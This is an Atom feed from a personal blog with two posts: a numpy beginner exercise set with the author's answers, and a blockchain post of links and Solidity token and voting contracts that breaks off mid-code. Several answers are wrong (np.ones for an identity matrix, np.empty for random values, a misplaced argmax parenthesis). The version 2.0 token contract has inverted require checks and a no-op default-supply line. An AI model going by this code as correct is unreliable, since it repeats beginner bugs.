<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cat&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://runindark.com/"/>
  <updated>2020-03-04T13:54:00.609Z</updated>
  <id>http://runindark.com/</id>
  
  <author>
    <name>夜小猫</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>numpy基本操作</title>
    <link href="http://runindark.com/2020/03/04/numpy/"/>
    <id>http://runindark.com/2020/03/04/numpy/</id>
    <published>2020-03-04T10:59:24.638Z</published>
    <updated>2020-03-04T13:54:00.609Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""> </excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h5 id="1-导入numpy库"><a href="#1-导入numpy库" class="headerlink" title="1.导入numpy库"></a>1.导入numpy库</h5><blockquote><p>import numpy as np</p></blockquote><h5 id="2-建立一个一维数组-a-初始化为-4-5-6-1-输出a-的类型（type）-2-输出a的各维度的大小（shape）-3-输出-a的第一个元素（值为4）"><a href="#2-建立一个一维数组-a-初始化为-4-5-6-1-输出a-的类型（type）-2-输出a的各维度的大小（shape）-3-输出-a的第一个元素（值为4）" class="headerlink" title="2. 建立一个一维数组 a 初始化为[4,5,6], (1)输出a 的类型（type）(2)输出a的各维度的大小（shape）(3)输出 a的第一个元素（值为4）"></a>2. 建立一个一维数组 a 初始化为[4,5,6], (1)输出a 的类型（type）(2)输出a的各维度的大小（shape）(3)输出 a的第一个元素（值为4）</h5><blockquote><p>a = np.array([4,5,6])<br>print(a.dtype)<br>print(a.shape)<br>print(a[0])</p></blockquote><h5 id="3-建立一个二维数组-b-初始化为-4-5-6-1-2-3-1-输出各维度的大小（shape）-2-输出-b-0-0-，b-0-1-b-1-1-这三个元素（对应值分别为4-5-2）"><a href="#3-建立一个二维数组-b-初始化为-4-5-6-1-2-3-1-输出各维度的大小（shape）-2-输出-b-0-0-，b-0-1-b-1-1-这三个元素（对应值分别为4-5-2）" class="headerlink" title="3. 建立一个二维数组 b,初始化为 [ [4, 5, 6],[1, 2, 3]] (1)输出各维度的大小（shape）(2)输出 b(0,0)，b(0,1),b(1,1) 这三个元素（对应值分别为4,5,2）"></a>3. 建立一个二维数组 b,初始化为 [ [4, 5, 6],[1, 2, 3]] (1)输出各维度的大小（shape）(2)输出 b(0,0)，b(0,1),b(1,1) 这三个元素（对应值分别为4,5,2）</h5><blockquote><p>a = np.array([[4,5,6],[1,2,3]])<br>print(a.shape)<br>print(a[0].shape)<br>print(a[1].shape)<br>print(a[0][0])<br>print(a[0][1])<br>print(a[1][1])</p></blockquote><h5 id="4-1-建立一个全0矩阵-a-大小为-3x3-类型为整型（提示-dtype-int）-2-建立一个全1矩阵b-大小为4x5-3-建立一个单位矩阵c-大小为4x4-4-生成一个随机数矩阵d-大小为-3x2"><a href="#4-1-建立一个全0矩阵-a-大小为-3x3-类型为整型（提示-dtype-int）-2-建立一个全1矩阵b-大小为4x5-3-建立一个单位矩阵c-大小为4x4-4-生成一个随机数矩阵d-大小为-3x2" class="headerlink" title="4.(1)建立一个全0矩阵 a, 大小为 3x3; 类型为整型（提示: dtype = int）(2)建立一个全1矩阵b,大小为4x5; (3)建立一个单位矩阵c ,大小为4x4; (4)生成一个随机数矩阵d,大小为 3x2"></a>4.(1)建立一个全0矩阵 a, 大小为 3x3; 类型为整型（提示: dtype = int）(2)建立一个全1矩阵b,大小为4x5; (3)建立一个单位矩阵c ,大小为4x4; (4)生成一个随机数矩阵d,大小为 3x2</h5><blockquote><p>a = np.zeros([3,3], dtype = int)<br>b = np.ones([4,5])<br>c = np.ones([4,4])<br>d = np.empty([3,2])<br>print(a,b,c,d)</p></blockquote><h5 id="5-建立一个数组-a-值为-1-2-3-4-5-6-7-8-9-10-11-12-1-打印a-2-输出-下标为-2-3-0-0-这两个数组元素的值"><a href="#5-建立一个数组-a-值为-1-2-3-4-5-6-7-8-9-10-11-12-1-打印a-2-输出-下标为-2-3-0-0-这两个数组元素的值" class="headerlink" title="5. 建立一个数组 a,(值为[[1, 2, 3, 4], [5, 6, 7, 8], [9, 10, 11, 12]] ) ,(1)打印a; (2)输出 下标为(2,3),(0,0) 这两个数组元素的值"></a>5. 建立一个数组 a,(值为[[1, 2, 3, 4], [5, 6, 7, 8], [9, 10, 11, 12]] ) ,(1)打印a; (2)输出 下标为(2,3),(0,0) 这两个数组元素的值</h5><blockquote><p>a = np.array([[1, 2, 3, 4], [5, 6, 7, 8], [9, 10, 11, 12]])<br>print(a[2][3])<br>print(a[0][0])</p></blockquote><h5 id="6-把上一题的-a数组的-0到1行-2到3列，放到b里面去，（此处不需要从新建立a-直接调用即可）-1-输出b-2-输出b-的（0-0）这个元素的值"><a href="#6-把上一题的-a数组的-0到1行-2到3列，放到b里面去，（此处不需要从新建立a-直接调用即可）-1-输出b-2-输出b-的（0-0）这个元素的值" class="headerlink" title="6.把上一题的 a数组的 0到1行 2到3列，放到b里面去，（此处不需要从新建立a,直接调用即可）(1),输出b;(2) 输出b 的（0,0）这个元素的值"></a>6.把上一题的 a数组的 0到1行 2到3列，放到b里面去，（此处不需要从新建立a,直接调用即可）(1),输出b;(2) 输出b 的（0,0）这个元素的值</h5><blockquote><p>b = a[0:2,2:4]<br>print(b)</p></blockquote><h6 id="7-把第5题中数组a的最后两行所有元素放到-c中，（提示：-a-1-2-）-1-输出-c-2-输出-c-中第一行的最后一个元素（提示，使用-1-表示最后一个元素）"><a href="#7-把第5题中数组a的最后两行所有元素放到-c中，（提示：-a-1-2-）-1-输出-c-2-输出-c-中第一行的最后一个元素（提示，使用-1-表示最后一个元素）" class="headerlink" title="7.把第5题中数组a的最后两行所有元素放到 c中，（提示： a[1:2, :]）(1)输出 c ; (2) 输出 c 中第一行的最后一个元素（提示，使用 -1 表示最后一个元素）"></a>7.把第5题中数组a的最后两行所有元素放到 c中，（提示： a[1:2, :]）(1)输出 c ; (2) 输出 c 中第一行的最后一个元素（提示，使用 -1 表示最后一个元素）</h6><blockquote><p>c = a[1:3]<br>print(c)<br>print(c[-1][-1])</p></blockquote><h5 id="8-建立数组a-初始化a为-1-2-3-4-5-6-，输出-（0-0）（1-1）（2-0）这三个元素（提示：-使用-print-a-0-1-2-0-1-0-）"><a href="#8-建立数组a-初始化a为-1-2-3-4-5-6-，输出-（0-0）（1-1）（2-0）这三个元素（提示：-使用-print-a-0-1-2-0-1-0-）" class="headerlink" title="8.建立数组a,初始化a为[[1, 2], [3, 4], [5, 6]]，输出 （0,0）（1,1）（2,0）这三个元素（提示： 使用 print(a[[0, 1, 2], [0, 1, 0]]) ）"></a>8.建立数组a,初始化a为[[1, 2], [3, 4], [5, 6]]，输出 （0,0）（1,1）（2,0）这三个元素（提示： 使用 print(a[[0, 1, 2], [0, 1, 0]]) ）</h5><blockquote><p>a = np.array([[1, 2], [3, 4], [5, 6]])<br>print(a[0,1])<br>print(a[1,1])<br>print(a[2,0])</p></blockquote><h5 id="9-建立矩阵a-初始化为-1-2-3-4-5-6-7-8-9-10-11-12-，输出-0-0-1-2-2-0-3-1-提示使用-b-np-array-0-2-0-1-print-a-np-arange-4-b"><a href="#9-建立矩阵a-初始化为-1-2-3-4-5-6-7-8-9-10-11-12-，输出-0-0-1-2-2-0-3-1-提示使用-b-np-array-0-2-0-1-print-a-np-arange-4-b" class="headerlink" title="9.建立矩阵a ,初始化为[[1, 2, 3], [4, 5, 6], [7, 8, 9], [10, 11, 12]]，输出(0,0),(1,2),(2,0),(3,1) (提示使用 b = np.array([0, 2, 0, 1]) print(a[np.arange(4), b]))"></a>9.建立矩阵a ,初始化为[[1, 2, 3], [4, 5, 6], [7, 8, 9], [10, 11, 12]]，输出(0,0),(1,2),(2,0),(3,1) (提示使用 b = np.array([0, 2, 0, 1]) print(a[np.arange(4), b]))</h5><blockquote><p>a = np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9], [10, 11, 12]])<br>b = np.array([0,2,0,1])<br>print(a[np.arange(4),b])</p></blockquote><h5 id="10-对9-中输出的那四个元素，每个都加上10，然后重新输出矩阵a-提示：-a-np-arange-4-b-10-）"><a href="#10-对9-中输出的那四个元素，每个都加上10，然后重新输出矩阵a-提示：-a-np-arange-4-b-10-）" class="headerlink" title="10.对9 中输出的那四个元素，每个都加上10，然后重新输出矩阵a.(提示： a[np.arange(4), b] += 10 ）"></a>10.对9 中输出的那四个元素，每个都加上10，然后重新输出矩阵a.(提示： a[np.arange(4), b] += 10 ）</h5><blockquote><p>print(a[np.arange(4),b] + 10)</p></blockquote><h5 id="11-执行-x-np-array-1-2-，然后输出-x-的数据类型"><a href="#11-执行-x-np-array-1-2-，然后输出-x-的数据类型" class="headerlink" title="11. 执行 x = np.array([1, 2])，然后输出 x 的数据类型"></a>11. 执行 x = np.array([1, 2])，然后输出 x 的数据类型</h5><blockquote><p>x = np.array([1,2])<br>print(x.dtype)</p></blockquote><h5 id="12-执行-x-np-array-1-0-2-0-，然后输出-x-的数据类类型"><a href="#12-执行-x-np-array-1-0-2-0-，然后输出-x-的数据类类型" class="headerlink" title="12.执行 x = np.array([1.0, 2.0]) ，然后输出 x 的数据类类型"></a>12.执行 x = np.array([1.0, 2.0]) ，然后输出 x 的数据类类型</h5><blockquote><p>x = np.array([1.0,2.0])<br>print(x.dtype)</p></blockquote><h5 id="13-执行-x-np-array-1-2-3-4-dtype-np-float64-，y-np-array-5-6-7-8-dtype-np-float64-，然后输出-x-y-和-np-add-x-y"><a href="#13-执行-x-np-array-1-2-3-4-dtype-np-float64-，y-np-array-5-6-7-8-dtype-np-float64-，然后输出-x-y-和-np-add-x-y" class="headerlink" title="13.执行 x = np.array([[1, 2], [3, 4]], dtype=np.float64) ，y = np.array([[5, 6], [7, 8]], dtype=np.float64)，然后输出 x+y ,和 np.add(x,y)"></a>13.执行 x = np.array([[1, 2], [3, 4]], dtype=np.float64) ，y = np.array([[5, 6], [7, 8]], dtype=np.float64)，然后输出 x+y ,和 np.add(x,y)</h5><blockquote><p>x= np.array([[1, 2], [3, 4]], dtype=np.float64)<br>y = np.array([[5, 6], [7, 8]])<br>print(x+y)<br>print(np.add(x,y))</p></blockquote><h5 id="14-利用-13题目中的x-y-输出-x-y-和-np-subtract-x-y"><a href="#14-利用-13题目中的x-y-输出-x-y-和-np-subtract-x-y" class="headerlink" title="14. 利用 13题目中的x,y 输出 x-y 和 np.subtract(x,y)"></a>14. 利用 13题目中的x,y 输出 x-y 和 np.subtract(x,y)</h5><blockquote><p>print(x-y)<br>print(np.subtract(x,y))</p></blockquote><h5 id="15-利用13题目中的x，y-输出-x-y-和-np-multiply-x-y-还有-np-dot-x-y-比较差异。然后自己换一个不是方阵的试试。"><a href="#15-利用13题目中的x，y-输出-x-y-和-np-multiply-x-y-还有-np-dot-x-y-比较差异。然后自己换一个不是方阵的试试。" class="headerlink" title="15. 利用13题目中的x，y 输出 x*y ,和 np.multiply(x, y) 还有 np.dot(x,y),比较差异。然后自己换一个不是方阵的试试。"></a>15. 利用13题目中的x，y 输出 x*y ,和 np.multiply(x, y) 还有 np.dot(x,y),比较差异。然后自己换一个不是方阵的试试。</h5><blockquote><p>print(x<em>y)<br>print(np.dot(x,y))<br>a = np.ones([5,5])<br>b = np.ones([5,5])<br>print(a</em>b)<br>print(np.dot(a,b))</p></blockquote><h5 id="16-利用13题目中的x-y-输出-x-y-提示-：-使用函数-np-divide"><a href="#16-利用13题目中的x-y-输出-x-y-提示-：-使用函数-np-divide" class="headerlink" title="16. 利用13题目中的x,y,输出 x / y .(提示 ： 使用函数 np.divide())"></a>16. 利用13题目中的x,y,输出 x / y .(提示 ： 使用函数 np.divide())</h5><blockquote><p>print(x/y)<br>print(np.divide(x,y))</p></blockquote><h5 id="17-利用13题目中的x-输出-x的-开方。-提示：-使用函数-np-sqrt"><a href="#17-利用13题目中的x-输出-x的-开方。-提示：-使用函数-np-sqrt" class="headerlink" title="17. 利用13题目中的x,输出 x的 开方。(提示： 使用函数 np.sqrt() )"></a>17. 利用13题目中的x,输出 x的 开方。(提示： 使用函数 np.sqrt() )</h5><blockquote><p>print(np.sqrt(x))</p></blockquote><h5 id="18-利用13题目中的x-y-执行-print-x-dot-y-和-print-np-dot-x-y"><a href="#18-利用13题目中的x-y-执行-print-x-dot-y-和-print-np-dot-x-y" class="headerlink" title="18.利用13题目中的x,y ,执行 print(x.dot(y)) 和 print(np.dot(x,y))"></a>18.利用13题目中的x,y ,执行 print(x.dot(y)) 和 print(np.dot(x,y))</h5><blockquote><p>print(x.dot(y))<br>print(np.dot(x,y))</p></blockquote><h5 id="19-利用13题目中的-x-进行求和。提示：输出三种求和-1-print-np-sum-x-2-print-np-sum-x，axis-0-3-print-np-sum-x-axis-1"><a href="#19-利用13题目中的-x-进行求和。提示：输出三种求和-1-print-np-sum-x-2-print-np-sum-x，axis-0-3-print-np-sum-x-axis-1" class="headerlink" title="19.利用13题目中的 x,进行求和。提示：输出三种求和 (1)print(np.sum(x)): (2)print(np.sum(x，axis =0 )); (3)print(np.sum(x,axis = 1))"></a>19.利用13题目中的 x,进行求和。提示：输出三种求和 (1)print(np.sum(x)): (2)print(np.sum(x，axis =0 )); (3)print(np.sum(x,axis = 1))</h5><blockquote><p>print(np.sum(x))<br>print(np.sum(x,axis=0))<br>print(np.sum(x,axis=1))</p></blockquote><h5 id="20-利用13题目中的-x-进行求平均数（提示：输出三种平均数-1-print-np-mean-x-2-print-np-mean-x-axis-0-3-print-np-mean-x-axis-1-）"><a href="#20-利用13题目中的-x-进行求平均数（提示：输出三种平均数-1-print-np-mean-x-2-print-np-mean-x-axis-0-3-print-np-mean-x-axis-1-）" class="headerlink" title="20.利用13题目中的 x,进行求平均数（提示：输出三种平均数(1)print(np.mean(x)) (2)print(np.mean(x,axis = 0))(3) print(np.mean(x,axis =1))）"></a>20.利用13题目中的 x,进行求平均数（提示：输出三种平均数(1)print(np.mean(x)) (2)print(np.mean(x,axis = 0))(3) print(np.mean(x,axis =1))）</h5><blockquote><p>print(np.mean(x))<br>print(np.mean(x,axis=0))<br>print(np.mean(x,axis=1))</p></blockquote><h5 id="21-利用13题目中的x，对x-进行矩阵转置，然后输出转置后的结果，（提示：-x-T-表示对-x-的转置）"><a href="#21-利用13题目中的x，对x-进行矩阵转置，然后输出转置后的结果，（提示：-x-T-表示对-x-的转置）" class="headerlink" title="21.利用13题目中的x，对x 进行矩阵转置，然后输出转置后的结果，（提示： x.T 表示对 x 的转置）"></a>21.利用13题目中的x，对x 进行矩阵转置，然后输出转置后的结果，（提示： x.T 表示对 x 的转置）</h5><blockquote><p>print(x)<br>print(x.T)</p></blockquote><h5 id="22-利用13题目中的x-求e的指数（提示：-函数-np-exp-）"><a href="#22-利用13题目中的x-求e的指数（提示：-函数-np-exp-）" class="headerlink" title="22.利用13题目中的x,求e的指数（提示： 函数 np.exp()）"></a>22.利用13题目中的x,求e的指数（提示： 函数 np.exp()）</h5><blockquote><p>print(np.exp(x))</p></blockquote><h5 id="23-利用13题目中的-x-求值最大的下标（提示-1-print-np-argmax-x-2-print-np-argmax-x-axis-0-3-print-np-argmax-x-axis-1"><a href="#23-利用13题目中的-x-求值最大的下标（提示-1-print-np-argmax-x-2-print-np-argmax-x-axis-0-3-print-np-argmax-x-axis-1" class="headerlink" title="23.利用13题目中的 x,求值最大的下标（提示(1)print(np.argmax(x)) ,(2) print(np.argmax(x, axis =0))(3)print(np.argmax(x),axis =1))"></a>23.利用13题目中的 x,求值最大的下标（提示(1)print(np.argmax(x)) ,(2) print(np.argmax(x, axis =0))(3)print(np.argmax(x),axis =1))</h5><blockquote><p>print(np.argmax(x))<br>print(np.argmax(x,axis=0))<br>print(np.argmax(x),axis=1)</p></blockquote><h5 id="24-画图，y-x-x-其中-x-np-arange-0-100-0-1-（提示这里用到-matplotlib-pyplot-库）"><a href="#24-画图，y-x-x-其中-x-np-arange-0-100-0-1-（提示这里用到-matplotlib-pyplot-库）" class="headerlink" title="24.画图，y=x*x 其中 x = np.arange(0, 100, 0.1) （提示这里用到 matplotlib.pyplot 库）"></a>24.画图，y=x*x 其中 x = np.arange(0, 100, 0.1) （提示这里用到 matplotlib.pyplot 库）</h5><blockquote><p>x = np.arange(0, 100, 0.1)<br>y = x * x<br>plt.plot(x, y)<br>plt.show()</p></blockquote><h5 id="25-画图。画正弦函数和余弦函数，-x-np-arange-0-3-np-pi-0-1-提示：这里用到-np-sin-np-cos-函数和-matplotlib-pyplot-库"><a href="#25-画图。画正弦函数和余弦函数，-x-np-arange-0-3-np-pi-0-1-提示：这里用到-np-sin-np-cos-函数和-matplotlib-pyplot-库" class="headerlink" title="25.画图。画正弦函数和余弦函数， x = np.arange(0, 3 * np.pi, 0.1)(提示：这里用到 np.sin() np.cos() 函数和 matplotlib.pyplot 库)"></a>25.画图。画正弦函数和余弦函数， x = np.arange(0, 3 * np.pi, 0.1)(提示：这里用到 np.sin() np.cos() 函数和 matplotlib.pyplot 库)</h5><blockquote><p>x = np.arange(0, 3*np.pi, 0.1)<br>y = np.sin(x)<br>plt.plot(x, y)<br>plt.show()<br>y = np.cos(x)<br>plt.plot(x, y)<br>plt.show()</p></blockquote></the>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt; &lt;/excerpt&gt;&lt;/p&gt;
&lt;the rest=&quot;&quot; of=&quot;&quot; contents=&quot;&quot; |=&quot;&quot; 余下全文=&quot;&quot;&gt;

&lt;h5 id=&quot;1-导入numpy库&quot;&gt;&lt;a href=&quot;#1-导入nump
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>区块链</title>
    <link href="http://runindark.com/2019/11/17/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    <id>http://runindark.com/2019/11/17/区块链/</id>
    <published>2019-11-17T04:46:17.809Z</published>
    <updated>2019-11-25T11:06:21.034Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h1 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h1><h2 id="导航雷达"><a href="#导航雷达" class="headerlink" title="导航雷达"></a>导航雷达</h2><h3 id="区块链白皮书"><a href="#区块链白皮书" class="headerlink" title="区块链白皮书"></a>区块链白皮书</h3><blockquote><p><a href="https://ethfans.org/posts/ethereum-whitepaper" target="_blank" rel="noopener">https://ethfans.org/posts/ethereum-whitepaper</a></p></blockquote><h2 id="钱包教程"><a href="#钱包教程" class="headerlink" title="钱包教程"></a>钱包教程</h2><blockquote><p><a href="http://www.aibbt.com/a/26227.html" target="_blank" rel="noopener">http://www.aibbt.com/a/26227.html</a></p></blockquote><h2 id="国内矿池"><a href="#国内矿池" class="headerlink" title="国内矿池"></a>国内矿池</h2><h3 id="f2pool"><a href="#f2pool" class="headerlink" title="f2pool"></a>f2pool</h3><blockquote><p><a href="https://www.f2pool.com/" target="_blank" rel="noopener">https://www.f2pool.com/</a></p></blockquote><h2 id="truffle"><a href="#truffle" class="headerlink" title="truffle"></a>truffle</h2><p>Truffle 教程：教你开发、部署第一个去中心化应用 (Dapp) - 宠物商店</p><h2 id="blockchain-demo"><a href="#blockchain-demo" class="headerlink" title="blockchain-demo"></a>blockchain-demo</h2><h3 id="MyToken-EC20-官方铸币代码"><a href="#MyToken-EC20-官方铸币代码" class="headerlink" title="MyToken - EC20 - 官方铸币代码"></a>MyToken - EC20 - 官方铸币代码</h3><ol><li>version 1.0</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.20</span>;</span><br><span class="line"></span><br><span class="line">contract MyToken&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*创建一个带有全部余额的key-value数组*/</span></span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balanceOf ;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*初始化区块铸币总金额，利用这样的方法可以保证货币后期总量不会被改变*/</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">myToken</span> (<span class="params">uint256 initialSupply</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        balanceOf[msg.sender] = initialSupply ;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*金额转账*/</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span> (<span class="params">address _to,uint256 _value</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*确保发出请求的余额充足*/</span></span><br><span class="line">        <span class="built_in">require</span>(balanceOf[msg.sender] &gt;= _value);</span><br><span class="line">        <span class="comment">/*过流检验*/</span></span><br><span class="line">        <span class="built_in">require</span>(balanceOf[_to] + _value &gt;= balanceOf[_to]) ;</span><br><span class="line">        balanceOf[msg.sender] -= _value ;</span><br><span class="line">        balanceOf[_to] += _value ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>version 2.0<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract MyToken&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    string public name ; <span class="comment">// coin name</span></span><br><span class="line">    string public symbol ; <span class="comment">// coin symbol</span></span><br><span class="line">    uint8 public decimals ; <span class="comment">// coin decimals</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// key-value for all people in this block</span></span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balanceOf ;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// track for dealing</span></span><br><span class="line">    event Transfer (address indexed_from,address indexed_to,uint256 value) ;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">constructor</span>(uint256 _supply,string _name,string _symbol,uint8 _decimals) public &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (_supply == <span class="number">0</span>) _supply == <span class="number">1000000</span> ;</span><br><span class="line">        balanceOf[msg.sender] = _supply ;</span><br><span class="line">        name = _name ;</span><br><span class="line">        symbol = _symbol ;</span><br><span class="line">        decimals = _decimals ;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span> (<span class="params">address _to,uint256 _value</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">require</span>(balanceOf[msg.sender] &lt; _value) ;</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[_to] + _value &lt; balanceOf[_to]) ;</span><br><span class="line">        </span><br><span class="line">        balanceOf[msg.sender] -= _value ;</span><br><span class="line">        balanceOf[_to] += _value ;</span><br><span class="line">        </span><br><span class="line">        emit Transfer(msg.sender,_to,_value) ;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="投票系统-综合类合约"><a href="#投票系统-综合类合约" class="headerlink" title="投票系统 - 综合类合约"></a>投票系统 - 综合类合约</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.22</span> ;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 投票合约</span></span><br><span class="line">contract Ballot&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//此处声明一个新的复合类型，代表一个单一投票者</span></span><br><span class="line">    struct Voter&#123;</span><br><span class="line">        uint weight ;</span><br><span class="line">        bool voted ;</span><br><span class="line">        address delegate ;</span><br><span class="line">        uint vote ;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 用于单一提案的结构类型</span></span><br><span class="line">    struct Proposal&#123;</span><br><span class="line">        bytes32 name ;</span><br><span class="line">        uint voteCount ;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 当前选票人地址</span></span><br><span class="line">    address public chairperson ;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 投票人员</span></span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> Voter) public voters ;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 提案编号</span></span><br><span class="line">    Proposal[] public proposals ;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 选择proposalNames 创建新的的投票</span></span><br><span class="line">    <span class="keyword">constructor</span> (bytes32[] proposalNames) public &#123;</span><br><span class="line">        chairperson = msg.sender ;</span><br><span class="line">        voters[chairperson].weight = <span class="number">1</span> ;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 对于每个提供的提案名，创建一个新的提案对象，加到数组末尾</span></span><br><span class="line">        <span class="keyword">for</span> (uint i=<span class="number">0</span>;i&lt;proposalNames.length;i++)&#123;</span><br><span class="line">            proposals.push(Proposal(&#123;</span><br><span class="line">                name : proposalNames[i],</span><br><span class="line">                voteCount : <span class="number">0</span> </span><br><span class="line">            &#125;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 对于本次投票中的“voter”给予投票权，只能由 “chairperson”调用</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">giveRightToVote</span>(<span class="params">address voter</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 